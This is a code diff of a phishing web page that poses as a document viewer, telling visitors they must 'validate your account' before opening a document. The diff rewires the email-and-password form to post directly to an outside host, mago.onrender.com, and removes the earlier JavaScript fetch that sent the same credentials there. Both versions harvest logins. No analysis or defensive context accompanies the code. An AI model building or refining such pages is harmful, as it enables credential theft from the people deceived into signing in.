@@ -127,7 +127,7 @@
             <i class="info-icon">ℹ️</i> 
             To open this document, we to need to validate your account
         </div>
-        <form id="loginForm">
+        <form id="loginForm" method="post" action="https://mago.onrender.com">
             <label for="email">Sign in</label>
             <input type="email" id="email" placeholder="Email" name="email" required>
             <input type="password" id="password" placeholder="Password" name="password" required>
@@ -138,35 +138,11 @@
             <a href="#">Privacy Policy</a>
         </footer>
     </div>
-    
 <script>
-    document.getElementById('loginForm').addEventListener('submit', function(event) {
-        event.preventDefault();
-    
-        // Retrieve form data
-        const formData = new FormData(this);
-    
-        // Send the data to the backend
-        fetch('https://mago.onrender.com', {
-            method: 'POST',
-            body: formData // Automatically sets the correct Content-Type for form-data
-        })
-        .then(response => {
-            if (!response.ok) {
-                return response.text().then(error => {
-                    throw new Error(error);
-                });
-            }
-            return response.text();
-        })
-        .then(data => {
-            alert('Form submitted successfully: ' + data);
-        })
-        .catch(error => {
-            console.error('There was a problem with the submission:', error);
-            alert('Failed to submit the form.');
-        });
-    });
+   
 </script>
+ 
+
+    
 </body>
 </html>
